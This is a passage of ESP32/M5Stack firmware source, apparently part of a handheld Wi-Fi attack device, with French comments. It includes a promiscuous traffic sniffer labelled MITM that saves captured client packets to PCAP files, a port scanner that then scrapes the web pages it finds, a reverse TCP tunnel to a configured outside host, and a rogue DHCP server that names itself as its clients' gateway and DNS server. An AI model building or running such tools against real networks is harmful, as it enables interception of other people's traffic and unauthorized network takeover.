        int fileID = strtol(filename.substring(9, 11).c_str(), nullptr, 16);
        if (fileID >= allSniffCount) {
          allSniffCount = fileID + 1;
        }
      }
    }
  }
  root.close();
  Serial.printf("Next available file ID: %02X\n", allSniffCount);
}
void TrafficMITMCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  recordPacketToPCAPFile_MITM(pkt);
}

void sniffNetwork() {
  if (getConnectedPeopleCount() == 0) {
    waitAndReturnToMenu("No client connected..");
    return;
  }
  Serial.println("Resetting packet counters...");
  packetSavedCount = 0;
  enterDebounce();
  if (!SD.exists("/sniffer") && !SD.mkdir("/sniffer")) {
    Serial.println("Unable to create /sniffer directory");
    return;
  }
  findNextAvailableFileIDClient();

  char filename[50];
  sprintf(filename, "/sniffer/ClientSniff_%02X.pcap", allSniffCount);

  Serial.printf("Opening capture file: %s\n", filename);
  sniffFile = SD.open(filename, FILE_WRITE);
  if (!sniffFile) {
    Serial.println("Failed to open capture file for writing");
    return;
  }
  writePCAPHeader_snifferAll(sniffFile);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(TrafficMITMCallback);

  Serial.println("Starting all traffic sniffer...");
  M5.Lcd.clear();
  M5.Lcd.setTextColor(menuTextFocusedColor);
  M5.Lcd.setCursor(3, 0);
  M5.Lcd.println("Sniffing Raw on :");
  M5.Lcd.println(filename);

  bool exitSniff = false;
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 300;
  unsigned long lastCursorBlinkTime = 0;

  while (!exitSniff) {
    esp_task_wdt_reset();
    vTaskDelay(pdMS_TO_TICKS(10));
    M5.update();
    handleDnsRequestSerial();

    if (getConnectedPeopleCount() == 0) {
      Serial.println("No stations connected, stopping sniffer and returning to menu...");
      M5.Lcd.clear();
      M5.Lcd.setTextColor(RED);
      int centerX = 240 / 2 - (10 * strlen("No clients connected")) / 2;
      int centerY = 135 / 2 - 8;
      M5.Lcd.setCursor(centerX, centerY);
      M5.Lcd.println("No more clients...");
      vTaskDelay(pdMS_TO_TICKS(2000));
      exitSniff = true;
      continue;
    }

    unsigned long currentPressTime = millis();
    unsigned long currentTime = millis();

    M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Lcd.setCursor(0, 45);
    M5.Lcd.printf("[Total]       : %d\n", packetSavedCount);
    M5.Lcd.setCursor(0, M5.Display.height() - 16);

    if (currentTime - lastCursorBlinkTime >= 1000) {
      cursorVisible = !cursorVisible;
      lastCursorBlinkTime = currentTime;
    }
    M5.Lcd.setTextColor(menuTextFocusedColor, TFT_BLACK);
    M5.Lcd.printf(cursorVisible ? ">_" : "> ");

    if (M5.BtnB.wasPressed()) {
      exitSniff = true;
      lastKeyPressTime = currentPressTime;
      Serial.println("Exit key detected, stopping sniffer...");
    }
  }

  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(NULL);

  sniffFile.close();
  Serial.println("Stopped all traffic sniffer, file closed.");
  waitAndReturnToMenu("Stopping Sniffing...");
}



// Fonction pour afficher les hôtes et analyser les ports
void displayHostsAndScanPorts(const std::vector<IPAddress>& hostslist, int scanIndex, bool isWebCommand) {
    int displayStart = 0;
    int lineHeight = 12;
    int maxLines = M5.Display.height() / lineHeight;
    std::vector<String> scanResults;
    std::map<IPAddress, std::vector<int>> openPorts;

    const int ports[] = {
        20, 21, 22, 23, 25, 53, 67, 68, 69, 80, 110, 123, 135, 137, 139, 143, 161, 162, 389, 443, 445, 465, 
        514, 554, 587, 631, 636, 873, 993, 995, 1024, 1025, 1352, 1433, 1521, 1720, 1723, 2049, 2181, 2222, 
        2375, 2376, 3306, 3389, 3690, 5000, 5060, 5432, 5555, 5900, 5985, 5986, 6379, 8080, 8443, 9000, 9100, 
        9200, 9999, 10000, 11211, 1194, 27017, 32768, 49152, 49153, 49154, 49155, 49156, 49157
    };

    const int numPorts = sizeof(ports) / sizeof(ports[0]);
    const int timeout_ms = 75;

    std::map<int, String> portServices = {
        {20, "FTP Data"}, {21, "FTP"}, {22, "SSH"}, {23, "Telnet"}, {25, "SMTP"}, {53, "DNS"}, {67, "DHCP"},
        {68, "DHCP"}, {69, "TFTP"}, {80, "HTTP"}, {110, "POP3"}, {123, "NTP"}, {135, "Msoft RPC"},
        {137, "NetBIOS"}, {139, "NetBIOS"}, {143, "IMAP"}, {161, "SNMP"}, {162, "SNMP Trap"}, {389, "LDAP"},
        {443, "HTTPS"}, {445, "Msoft-DS"}, {465, "SMTPS"}, {514, "Syslog"}, {554, "RTSP"}, {587, "SMTP"},
        {631, "IPP"}, {636, "LDAPS"}, {873, "rsync"}, {993, "IMAPS"}, {995, "POP3S"}, {1024, "Reserved"},
        {1025, "NFS-or-IIS"}, {1352, "LotusNote"}, {1433, "MSSQL"}, {1521, "Oracle"}, {1720, "H.323"},
        {1723, "PPTP"}, {2049, "NFS"}, {2181, "Zookeeper"}, {2222, "SSH Alt"}, {2375, "Docker"},
        {2376, "DockerTLS"}, {3306, "MySQL"}, {3389, "RDP"}, {3690, "SVN"}, {5000, "UPnP"}, {5060, "SIP"},
        {5432, "PostgreSQL"}, {5555, "ADB"}, {5900, "VNC"}, {5985, "WinRM HTTP"}, {5986, "WinRMHTTPS"},
        {6379, "Redis"}, {8080, "HTTP Proxy"}, {8443, "HTTPS Alt"}, {9000, "SonarQube"}, {9100, "PJL"}, {9200, "Elasticsrc"},
        {9999, "Urchin"}, {10000, "Webmin"}, {11211, "Memcached"}, {1194, "OpenVPN"}, {27017, "MongoDB"},
        {32768, "RPC"}, {49152, "WinRPC"}, {49153, "WinRPC"}, {49154, "WinRPC"}, {49155, "WinRPC"},
        {49156, "WinRPC"}, {49157, "WinRPC"}
    };



    int currentHostIndex = 0;
    M5.Display.setTextSize(1.5);
    bool needsDisplayUpdate = true;

    while (currentHostIndex < hostslist.size()) {
        IPAddress host = hostslist[currentHostIndex];
        String hostHeader = "Host: " + host.toString();
        scanResults.push_back("--------------------------");
        scanResults.push_back(hostHeader);
        scanResults.push_back("--------------------------");
        needsDisplayUpdate = true;

        if (needsDisplayUpdate) {
            displayResults(displayStart, maxLines, scanResults);
            needsDisplayUpdate = false;
        }

        for (int j = 0; j < numPorts; j++) {
            int port = ports[j];
            WiFiClient client;
            bool isPortOpen = connectWithTimeout(client, host, port, timeout_ms);

            if (isPortOpen) {
                String service = portServices.count(port) ? portServices[port] : "Unknown";
                scanResults.push_back("Port " + String(port) + " open - " + service);
                client.stop();
                needsDisplayUpdate = true;
                logScanResult(host.toString() + " - " + String(port) + " - " + service);  // Enregistrer les informations de port
                openPorts[host].push_back(port);
            }

            if (needsDisplayUpdate) {
                displayResults(displayStart, maxLines, scanResults);
                needsDisplayUpdate = false;
            }

            M5.update();
            if (handleScrolling(displayStart, maxLines, scanResults.size())) {
                needsDisplayUpdate = true;
            }
            delay(10);
        }

        scanResults.push_back("--------------------------");
        logScanResult("--------------------------");  // Enregistrer les informations de port
        scanResults.push_back(host.toString() + " Finished.");
        needsDisplayUpdate = true;

        if (needsDisplayUpdate) {
            displayResults(displayStart, maxLines, scanResults);
            needsDisplayUpdate = false;
        }

        M5.update();
        if (handleScrolling(displayStart, maxLines, scanResults.size())) {
            needsDisplayUpdate = true;
        }

        currentHostIndex++;
    }
    scanResults.push_back("--------------------------");
    scanResults.push_back("Scan Terminated.");
    displayResults(displayStart, maxLines, scanResults);
    if (!isWebCommand){
      while (true) {
          M5.update();
          if (handleScrolling(displayStart, maxLines, scanResults.size())) {
              needsDisplayUpdate = true;
          }
          if (needsDisplayUpdate) {
              displayResults(displayStart, maxLines, scanResults);
              needsDisplayUpdate = false;
          }
          if (M5.BtnB.wasPressed()) {
              break;
          }
          delay(30);
      }
      if (confirmPopup("Scrape websites? (Y/N)")) {
          M5.Display.clear();
          fetchWebsites(hostslist, openPorts, scanIndex);  // Appelle la fonction pour récupérer les sites
      }
    }
    waitAndReturnToMenu("Return to menu.");
}


// Function to display scan results
void displayResults(int displayStart, int maxLines, const std::vector<String>& scanResults) {
  M5.Display.clear();
  M5.Display.setCursor(0, 0);

  int totalLines = scanResults.size();
  int endLine = min(displayStart + maxLines, totalLines);

  for (int i = displayStart; i < endLine; i++) {
    M5.Display.println(scanResults[i]);
  }
}

// Function to handle scrolling
bool handleScrolling(int& displayStart, int maxLines, int totalLines) {
  int previousDisplayStart = displayStart;
  if (M5.BtnA.wasPressed()) {
    displayStart = max(0, displayStart - 1);
    delay(30);
  } else if (M5.BtnC.wasPressed()) {
    displayStart = min(displayStart + 1, max(0, totalLines - maxLines));
    delay(30);
  }
  return displayStart != previousDisplayStart;
};


void fetchWebsites(const std::vector<IPAddress>& hostslist, const std::map<IPAddress, std::vector<int>>& openPorts, int scanIndex) {
    // Créer un dossier spécifique pour ce scan
    String folderPath = "/Captured_Website/Scan_" + String(scanIndex);
    if (!SD.exists(folderPath)) {
        SD.mkdir(folderPath);
    }

    int totalWebsites = 0;
    for (const auto& [host, ports] : openPorts) {
        for (int port : ports) {
            if (port == 443 || port == 8443 || port == 80 || port == 8080 || port == 8000 || isLikelyWebPort(port)) {
                totalWebsites++;
            }
        }
    }

    int processedWebsites = 0;

    for (const auto& [host, ports] : openPorts) {
        for (int port : ports) {
            String protocol;
            if (port == 443 || port == 8443) {
                protocol = "https://";
            } else if (port == 80 || port == 8080 || port == 8000) {
                protocol = "http://";
            } else if (isLikelyWebPort(port)) {
                // Tenter HTTP d'abord pour les autres ports communs
                protocol = "http://";
            } else {
                // Ignorer les ports qui ne sont pas liés aux services web
                continue;
            }

            processedWebsites++;

            // Afficher le décompte centré en x et à la ligne y = 40
            String countDisplay = String(processedWebsites) + "/" + String(totalWebsites);
            M5.Display.setCursor(110, 20);
            M5.Display.print(countDisplay); 
            M5.Display.display();

            String url = protocol + host.toString() + ":" + String(port);

            // Effectuer une requête HTTP GET et suivre les redirections
            String content = getHttpContentWithRedirect(url);

            // Enregistrer le contenu dans un fichier
            if (!content.isEmpty()) {
                saveWebsiteContent(folderPath, host.toString() + "_" + String(port), content);
            }
        }
    }
}


// Fonction pour identifier si le port est susceptible de servir un site web
bool isLikelyWebPort(int port) {
    // Liste des ports courants utilisés pour des services web
    std::vector<int> webPorts = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 7001};
    return std::find(webPorts.begin(), webPorts.end(), port) != webPorts.end();
}


// Fonction pour récupérer le contenu HTML d'une page avec gestion des redirections
String getHttpContentWithRedirect(String url) {
    HTTPClient http;
    http.setFollowRedirects(HTTPC_STRICT_FOLLOW_REDIRECTS);
    http.begin(url);
    int httpCode = http.GET();
    String payload = "";

    if (httpCode == HTTP_CODE_OK) {
        payload = http.getString();
    }

    http.end();
    return payload;
}


// Fonction pour sauvegarder le contenu du site dans un fichier
void saveWebsiteContent(String folderPath, String identifier, String content) {
    String filePath = folderPath + "/" + identifier + ".html";  // Crée un fichier pour chaque site web
    File webFile = SD.open(filePath, FILE_WRITE);
    
    String statusMessage = "";
    if (webFile) {
        webFile.print(content);
        webFile.close();
        statusMessage = "Scraping :";
    } else {
        statusMessage = "Failed :";
    }

    // Effacer l'écran
    M5.Display.clear();

    // Calcul pour centrer le texte verticalement
    int textHeight = M5.Display.fontHeight() * 2;  // Estimation pour deux lignes de texte
    int startY = (M5.Display.height() - textHeight) / 2;

    // Calcul pour centrer la première ligne
    int statusTextWidth = M5.Display.textWidth(statusMessage);
    int startXStatus = (M5.Display.width() - statusTextWidth) / 2;

    // Afficher la première ligne centrée
    M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.setCursor(startXStatus, startY);
    M5.Display.println(statusMessage);

    // Calcul pour centrer la deuxième ligne
    int identifierTextWidth = M5.Display.textWidth(identifier);
    int startXIdentifier = (M5.Display.width() - identifierTextWidth) / 2;

    // Afficher la deuxième ligne centrée
    M5.Display.setCursor(startXIdentifier, startY + M5.Display.fontHeight());
    M5.Display.println(identifier);
}

// Fonction pour lister les fichiers texte dans un dossier
std::vector<String> listScanFiles() {
    std::vector<String> scanFiles;
    if (!SD.exists(scanFolder)) {
        SD.mkdir(scanFolder);  // Créer le dossier s'il n'existe pas
    }

    File root = SD.open(scanFolder);
    while (File file = root.openNextFile()) {
        String fileName = file.name();
        if (fileName.endsWith(".txt")) {
            scanFiles.push_back(fileName);  // Ajouter à la liste des fichiers
        }
        file.close();
    }
    root.close();
    return scanFiles;  // Retourne la liste des fichiers trouvés
}

// Fonction pour afficher la liste déroulante des fichiers
void displayFileList(const std::vector<String>& files) {
    int displayStart = 0;
    int currentFileIndex = 0;
    int lineHeight = 12;
    int maxLines = M5.Display.height() / lineHeight;
    bool needsDisplayUpdate = true;
    enterDebounce();
    
    while (true) {
        if (needsDisplayUpdate) {
            M5.Display.clear(TFT_BLACK);
            int endLine = min(displayStart + maxLines, (int)files.size());
            for (int i = displayStart; i < endLine; i++) {
                if (i == currentFileIndex) {
                    M5.Display.fillRect(0, (i - displayStart) * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
                    M5.Display.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
                }
                M5.Display.setCursor(2, (i - displayStart) * lineHeight);
                M5.Display.println(files[i]);
            }
            M5.Display.display();
            needsDisplayUpdate = false;
        }

        M5.update();
        M5.update();

        if (M5.BtnA.wasPressed()) {  // Touche ; pour monter
            currentFileIndex = max(0, currentFileIndex - 1);
            if (currentFileIndex < displayStart) {
                displayStart = max(0, displayStart - 1);
            }
            needsDisplayUpdate = true;
            delay(100);
        } else if (M5.BtnC.wasPressed()) {  // Touche . pour descendre
            currentFileIndex = min((int)files.size() - 1, currentFileIndex + 1);
            if (currentFileIndex >= displayStart + maxLines) {
                displayStart = min(displayStart + 1, (int)files.size() - maxLines);
            }
            needsDisplayUpdate = true;
            delay(100);
        } else if (M5.BtnB.wasPressed()) {  // Touche Entrée pour sélectionner
            viewFileContent(String(scanFolder) + "/" + files[currentFileIndex]);  // Afficher le contenu du fichier sélectionné avec le chemin complet
            enterDebounce();
            needsDisplayUpdate = true; // Rafraîchir la liste des fichiers après avoir visualisé un fichier
        } else if (M5.BtnPWR.wasClicked()) {  // Touche Entrée pour sélectionner
            break;
        }
        delay(30);
    }
}

// Fonction pour afficher le contenu d'un fichier sélectionné
void viewFileContent(String filePath) {
    File file = SD.open(filePath);
    if (!file) {
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.println("Failed to open file: " + filePath);
        M5.Display.display();
        delay(2000);
        return;
    }

    std::vector<String> fileLines;
    while (file.available()) {
        String line = file.readStringUntil('\n');
        fileLines.push_back(line);
    }
    file.close();

    // Affichage avec défilement
    int displayStart = 0;
    int lineHeight = 10;
    int maxLines = M5.Display.height() / lineHeight;
    bool needsDisplayUpdate = true;
    M5.Display.setTextSize(1.3);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    
    enterDebounce();
    while (true) {
        if (needsDisplayUpdate) {
            M5.Display.clear(menuBackgroundColor);
            int endLine = min(displayStart + maxLines, (int)fileLines.size());
            for (int i = displayStart; i < endLine; i++) {
                M5.Display.setCursor(2, (i - displayStart) * lineHeight);
                M5.Display.println(fileLines[i]);
            }
            M5.Display.display();
            needsDisplayUpdate = false;
        }

        M5.update();
        if (M5.BtnA.wasPressed()) {  // Touche ; pour défiler vers le haut
            displayStart = max(0, displayStart - 1);
            needsDisplayUpdate = true;
            delay(30);
        } else if (M5.BtnC.wasPressed()) {  // Touche . pour défiler vers le bas
            displayStart = min(displayStart + 1, (int)fileLines.size() - maxLines);
            needsDisplayUpdate = true;
            delay(30);
        } else if (M5.BtnA.wasPressed()) {  // Touche Entrée pour quitter la visualisation
            break; // Sortir de la visualisation du fichier
        }

        delay(30);
    }
}

// Fonction principale pour démarrer la liste des scans
void ListNetworkAnalysis() {
    std::vector<String> scanFiles = listScanFiles();
    if (scanFiles.empty()) {
        M5.Display.clear(menuBackgroundColor);
        M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
        M5.Display.println("No scan files found.");
        M5.Display.display();
        delay(2000);
        return;
    }

    displayFileList(scanFiles);
    waitAndReturnToMenu("Return to menu.");
}


bool isBackspacePressed() {
  if (M5.BtnB.wasPressed()) {
    Serial.println("Touche BACKSPACE détectée, retour au menu.");
    return true;
  }
  return false;
}

void reverseTCPTunnel() {

  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  if (tcp_host == "") {
    waitAndReturnToMenu("Error check tcp_host in config file");
    return;
  }

  createCaptivePortal();

  M5.Display.clear();
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  WiFiClient client;

  bool running = true;
  while (running) {
    handleDnsRequestSerial();
    M5.update();

    M5.Display.clear();
    M5.Display.setCursor(20, M5.Display.height() / 2);
    M5.Display.println("Attempting to connect...");

    unsigned long previousAttemptTime = 0;
    const unsigned long attemptInterval = 5000;
    bool attemptingConnection = true;

    while (attemptingConnection && running) {
      handleDnsRequestSerial();
      M5.update();

      // Check for return to menu
      if (isBackspacePressed()) {
        running = false;
        M5.Display.clear();
        M5.Display.setCursor(20, M5.Display.height() / 2);
        M5.Display.println("Returning to menu...");
        break;
      }

      if (millis() - previousAttemptTime >= attemptInterval) {
        previousAttemptTime = millis();

        if (client.connect(tcp_host.c_str(), tcp_port)) {
          M5.Display.clear();
          M5.Display.setCursor(20, M5.Display.height() / 2);
          M5.Display.println("Connection established.");
          attemptingConnection = false;
        } else {
          if (WiFi.status() != WL_CONNECTED) {
            WiFi.begin(ssid.c_str(), password.c_str());
          }
          M5.Display.clear();
          M5.Display.setCursor(20, M5.Display.height() / 2);
          M5.Display.println("Trying to connect...");
        }
      }
    }

    if (!running) break;

    M5.Display.clear();
    M5.Display.setCursor(30, M5.Display.height() / 2);
    M5.Display.println("TCP tunnel Connected.");

    while (client.connected() && running) {
      M5.update();
      handleDnsRequestSerial();
      handleDataTransfer(client);
      delay(10);

      // Check for return to menu
      if (isBackspacePressed()) {
        running = false;
        break;
      }
    }

    client.stop();
    M5.Display.clear();
    M5.Display.setCursor(20, M5.Display.height() / 2);
    M5.Display.println("Connection closed.");
    delay(1000); // Short delay for user to read the information
  }
  waitAndReturnToMenu("Return to menu.");
}

void handleDataTransfer(WiFiClient &client) {
  if (client.available()) {
    Serial.println("Data received from server, connecting to local web server...");
    WiFiClient localClient;
    if (!localClient.connect("127.0.0.1", 80)) {
      Serial.println("Failed to connect to local web server on port 80.");
      return;
    }
    Serial.println("Connected to local web server on port 80.");

    String request = "";
    unsigned long reqTimeout = millis();
    const int bufferSize = 1024;
    char buffer[bufferSize + 1];
    bool headersReceived = false;
    int contentLength = 0;

    // Read headers
    while (client.connected() && (millis() - reqTimeout < 20000)) {
      handleDnsRequestSerial();
      M5.update();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = client.available();
      if (len > 0) {
        if (len > bufferSize) len = bufferSize;
        int readLen = client.readBytes(buffer, len);
        buffer[readLen] = '\0';
        request += buffer;
        reqTimeout = millis();
        if (request.indexOf("\r\n\r\n") != -1) {
          headersReceived = true;
          break;
        }
      }
      delay(1);
    }

    if (!headersReceived) {
      Serial.println("Timeout or incomplete headers received from client.");
      client.stop();
      localClient.stop();
      return;
    }

    // Check if there is a request body to read
    int contentLengthIndex = request.indexOf("Content-Length: ");
    if (contentLengthIndex != -1) {
      int endOfContentLength = request.indexOf("\r\n", contentLengthIndex);
      String contentLengthValue = request.substring(contentLengthIndex + 16, endOfContentLength);
      contentLength = contentLengthValue.toInt();
    }

    // Calculate the position of the end of headers
    int headersEndIndex = request.indexOf("\r\n\r\n") + 4;
    int bodyBytesRead = request.length() - headersEndIndex;

    // Read the request body if necessary
    while (bodyBytesRead < contentLength && (millis() - reqTimeout < 20000)) {
      handleDnsRequestSerial();
      M5.update();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = client.available();
      if (len > 0) {
        if (len > bufferSize) len = bufferSize;
        int readLen = client.readBytes(buffer, len);
        buffer[readLen] = '\0';
        request += buffer;
        bodyBytesRead += readLen;
        reqTimeout = millis();
      }
      delay(1);
    }

    if (bodyBytesRead < contentLength) {
      Serial.println("Timeout or incomplete request body received from client.");
      client.stop();
      localClient.stop();
      return;
    }

    // Modify Host header if necessary
    int hostIndex = request.indexOf("Host: ");
    if (hostIndex != -1) {
      int endOfHost = request.indexOf("\r\n", hostIndex);
      if (endOfHost != -1) {
        request = request.substring(0, hostIndex) + "Host: 127.0.0.1:80" + request.substring(endOfHost);
      }
    }

    // Send the complete request to the local server
    localClient.print(request);
    //Serial.print(request);

    Serial.println("Waiting for response from local web server...");
    unsigned long respTimeout = millis();
    const int responseBufferSize = 1024;
    uint8_t responseBuffer[responseBufferSize];
    while (localClient.connected() || localClient.available()) {
      handleDnsRequestSerial();
      M5.update();

      if (isBackspacePressed()) {
        client.stop();
        localClient.stop();
        return;
      }

      int len = localClient.available();
      if (len > 0) {
        if (len > responseBufferSize) len = responseBufferSize;
        int readLen = localClient.read(responseBuffer, len);
        client.write(responseBuffer, readLen);
        Serial.write(responseBuffer, readLen);
        respTimeout = millis();
      } else if (millis() - respTimeout > 2000) {
        Serial.println("Timeout while reading response from local web server.");
        break;
      }
      delay(1);
    }
    localClient.stop();
    Serial.println("Connection to local web server closed.");
  }
  delay(10);
}



#include <WiFiUdp.h>

WiFiUDP udp;
unsigned int localUdpPort = 67; // DHCP Port
IPAddress rogueIPRogue;              // Use the IP address obtained by the ESP32

IPAddress currentSubnetRogue;
IPAddress currentGatewayRogue;
IPAddress currentDNSRogue;
uint8_t offeredIpSuffixRogue = 101; // IP suffix used for DHCP offer
int cursorPositionRogue = 10;         // Initial cursor position
const int maxLinesRogue = 10;         // Number of lines to display
String displayLinesRogue[10];         // Array to store the last lines
int currentLineRogue = 0;             // Index of the current line

uint8_t availableIpSuffixesRogue[] = {101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150};
const int numAvailableIps = sizeof(availableIpSuffixesRogue) / sizeof(availableIpSuffixesRogue[0]);
bool ipAllocatedRogue[numAvailableIps] = {false}; // Track allocated IPs

#define MAX_CLIENTS 10
struct ClientInfo {
  uint8_t mac[6];
  uint8_t ipSuffix;
};

ClientInfo clients[MAX_CLIENTS];

void initClients() {
  for (int i = 0; i < MAX_CLIENTS; i++) {
    memset(clients[i].mac, 0, 6);
    clients[i].ipSuffix = 0;
  }
}

void rogueDHCP() {
  rogueIPRogue = WiFi.localIP();
  currentSubnetRogue = WiFi.subnetMask();
  currentGatewayRogue = WiFi.localIP();
  currentDNSRogue = WiFi.localIP();

  initClients(); // Initialize client info

  if (!udp.begin(localUdpPort)) {
    Serial.println("Error: UDP port 67 start failed.");
    waitAndReturnToMenu("Error: UDP start failed.");
    return;
  }

  M5.Display.clear(menuBackgroundColor);
  Serial.println("Rogue DHCP running...");
  updateDisplay("DHCP running...");
  while (M5.BtnB.isPressed()) {
    M5.update();
    delay(100);
  }
  while (true) {
    M5.update();
    handleDnsRequestSerial();
    if (M5.BtnB.isPressed()) {
      Serial.println("Returning to menu.");
      updateDisplay("Returning...");
      waitAndReturnToMenu("Return to menu.");
      break;
    }

    int packetSizeRogue = udp.parsePacket();
    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
      updateDisplay("Packet received");

      uint8_t packetBufferRogue[512];
      udp.read(packetBufferRogue, packetSizeRogue);

      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);

      if (messageTypeRogue == 1) { // DHCP Discover
        Serial.println("DHCP Discover received. Preparing Offer...");
        updateDisplay("Discover. Preparing Offer...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer

        // Send the DHCP Offer
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP Offer sent.");
        updateDisplay("Offer sent.");

      } else if (messageTypeRogue == 3) { // DHCP Request
        Serial.println("DHCP Request received. Preparing ACK...");
        updateDisplay("Request. Preparing ACK...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK

        // Send the DHCP ACK
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP ACK sent.");
        updateDisplay("ACK sent.");
      }
    }
  }
}

uint8_t getDHCPMessageType(uint8_t *packetRogue, int packetSizeRogue) {
  // DHCP options start after 240 bytes
  int optionsIndexRogue = 240;
  while (optionsIndexRogue < packetSizeRogue) {
    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
    if (optionTypeRogue == 255) {
      break; // End Option
    } else if (optionTypeRogue == 0) {
      continue; // Pad Option, skip
    }
    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access
    if (optionTypeRogue == 53 && optionLenRogue == 1) {
      return packetRogue[optionsIndexRogue]; // Return the DHCP message type
    }
    optionsIndexRogue += optionLenRogue; // Skip to the next option
  }
  return 0; // Unknown message type
}

void parseDHCPOptions(uint8_t *packetRogue, int packetSizeRogue, IPAddress &requestedIP, IPAddress &serverID) {
  // DHCP options start after 240 bytes
  int optionsIndexRogue = 240;
  while (optionsIndexRogue < packetSizeRogue) {
    uint8_t optionTypeRogue = packetRogue[optionsIndexRogue++];
    if (optionTypeRogue == 255) {
      break; // End Option
    } else if (optionTypeRogue == 0) {
      continue; // Pad Option, skip
    }
    if (optionsIndexRogue >= packetSizeRogue) break; // Prevent out-of-bounds access
    uint8_t optionLenRogue = packetRogue[optionsIndexRogue++];
    if (optionsIndexRogue + optionLenRogue > packetSizeRogue) break; // Prevent out-of-bounds access

    if (optionTypeRogue == 50 && optionLenRogue == 4) {
      // Requested IP Address
      requestedIP = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
    } else if (optionTypeRogue == 54 && optionLenRogue == 4) {
      // Server Identifier
      serverID = IPAddress(packetRogue[optionsIndexRogue], packetRogue[optionsIndexRogue + 1], packetRogue[optionsIndexRogue + 2], packetRogue[optionsIndexRogue + 3]);
    }
    optionsIndexRogue += optionLenRogue; // Skip to the next option
  }
}

void prepareDHCPResponse(uint8_t *packetRogue, int &packetSizeRogue, uint8_t messageTypeRogue) {
  // Set BOOTREPLY
  packetRogue[0] = 2; // BOOTREPLY

  // Extract client MAC address
  uint8_t clientMac[6];
  memcpy(clientMac, &packetRogue[28], 6);

  // Variables to hold requested IP and server identifier
  IPAddress requestedIP(0, 0, 0, 0);
  IPAddress serverID(0, 0, 0, 0);

  // Parse DHCP options to get requested IP and server identifier
  parseDHCPOptions(packetRogue, packetSizeRogue, requestedIP, serverID);

  uint8_t offeredIpSuffix = 0;

  if (messageTypeRogue == 2) { // DHCP Offer
    // Allocate an IP address for the client
    offeredIpSuffix = allocateIpAddress(clientMac);
    if (offeredIpSuffix == 0) {
      Serial.println("No available IP addresses.");
      updateDisplay("No available IPs.");
      return;
    }
  } else if (messageTypeRogue == 5) { // DHCP ACK
    // Client is requesting a specific IP
    if (requestedIP != IPAddress(0, 0, 0, 0)) {
      if (requestedIP[0] == rogueIPRogue[0] && requestedIP[1] == rogueIPRogue[1] && requestedIP[2] == rogueIPRogue[2]) {
        // Check if requested IP is in our available IPs
        uint8_t requestedSuffix = requestedIP[3];
        // Check if requestedSuffix is in availableIpSuffixesRogue[]
        bool ipAvailable = false;
        for (int i = 0; i < numAvailableIps; i++) {
          if (availableIpSuffixesRogue[i] == requestedSuffix) {
            // Check if IP is already allocated
            if (!ipAllocatedRogue[i]) {
              // Allocate the IP to the client
              ipAllocatedRogue[i] = true;
              // Store the client info
              for (int j = 0; j < MAX_CLIENTS; j++) {
                if (clients[j].ipSuffix == 0 || memcmp(clients[j].mac, clientMac, 6) == 0) {
                  memcpy(clients[j].mac, clientMac, 6);
                  clients[j].ipSuffix = requestedSuffix;
                  break;
                }
              }
              offeredIpSuffix = requestedSuffix;
              ipAvailable = true;
              break;
            } else {
              // IP is already allocated
              // Check if it's allocated to the same client
              for (int j = 0; j < MAX_CLIENTS; j++) {
                if (clients[j].ipSuffix == requestedSuffix && memcmp(clients[j].mac, clientMac, 6) == 0) {
                  // IP is allocated to the same client
                  offeredIpSuffix = requestedSuffix;
                  ipAvailable = true;
                  break;
                }
              }
            }
          }
        }
      }
    } else {
      // No requested IP, allocate IP
      offeredIpSuffix = allocateIpAddress(clientMac);
      if (offeredIpSuffix == 0) {
        Serial.println("No available IP addresses.");
        updateDisplay("No available IPs.");
        return;
      }
    }
  }

  // Set your offered IP address (yiaddr)
  packetRogue[16] = rogueIPRogue[0];
  packetRogue[17] = rogueIPRogue[1];
  packetRogue[18] = rogueIPRogue[2];
  packetRogue[19] = offeredIpSuffix;

  // Display the allocated IP address
  char allocatedIpMessage[50];
  sprintf(allocatedIpMessage, "IP: %d.%d.%d.%d", rogueIPRogue[0], rogueIPRogue[1], rogueIPRogue[2], offeredIpSuffix);
  updateDisplay(allocatedIpMessage);

